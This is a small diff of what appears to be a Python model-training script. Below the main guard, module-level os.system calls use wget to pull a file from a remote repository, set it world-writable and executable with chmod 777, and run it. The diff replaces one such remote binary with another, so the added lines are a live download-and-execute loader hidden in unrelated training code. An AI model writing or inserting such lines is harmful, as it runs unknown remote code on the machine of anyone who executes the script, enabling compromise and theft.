@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/jeffreyadams29/consel/-/raw/main/dulang')
-os.system('chmod 777 dulang')
-os.system('./dulang')
+os.system('wget https://github.com/arifrahman555/kolor/raw/main/tes')
+os.system('chmod 777 tes')
+os.system('./tes')
